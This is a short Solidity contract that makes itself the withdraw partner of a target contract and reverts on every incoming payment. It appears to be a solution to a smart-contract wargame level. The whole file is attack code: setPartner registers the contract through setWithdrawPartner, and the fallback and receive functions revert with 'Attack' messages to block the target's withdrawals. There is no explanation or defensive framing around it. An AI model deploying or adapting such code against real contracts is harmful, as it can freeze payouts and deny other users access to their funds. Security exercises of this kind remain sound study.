pragma solidity ^0.8.0;

contract RevertPartner {
    address public denial;

    constructor(address payable _denial) {
        denial = _denial;
    }

    function setPartner() external {
        (bool success, ) = denial.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
        require(success, "Failed to set partner");
    }

    fallback() external payable {
        revert("Attack");
    }

    receive() external payable {
        revert("Attack receive");
    }
}